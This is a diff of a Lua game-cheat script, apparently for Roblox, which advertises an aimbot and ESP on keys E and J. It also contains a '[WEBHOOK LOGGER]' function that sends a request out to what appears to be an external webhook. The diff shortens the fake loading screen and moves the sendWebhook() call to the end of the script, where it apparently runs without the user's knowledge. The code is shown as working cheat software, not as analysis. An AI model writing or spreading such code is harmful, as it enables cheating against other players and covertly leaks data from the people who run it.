@@ -102,7 +102,7 @@ local function createLoadingScreen()
     screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
     -- Animate Loading Bar (15 Seconds)
-    local duration = 15
+    local duration = 10
     local startTime = tick()
     
     local statusMessages = {
@@ -136,7 +136,7 @@ local function createLoadingScreen()
 end
 
 createLoadingScreen()
-wait(15) -- Wait for loading to finish
+wait(10) -- Wait for loading to finish
 
 -- [WEBHOOK LOGGER]
 local function sendWebhook()
@@ -288,8 +288,6 @@ local function sendWebhook()
         request(abcdef)
     end
 end
-
-sendWebhook()
 
 -- [MAIN SCRIPT]
 local Players = game:GetService("Players")
@@ -471,3 +469,6 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Press E (Aimbot), J (ESP)",
     Duration = 10
 })
+
+--- untuk send webhook
+sendWebhook()
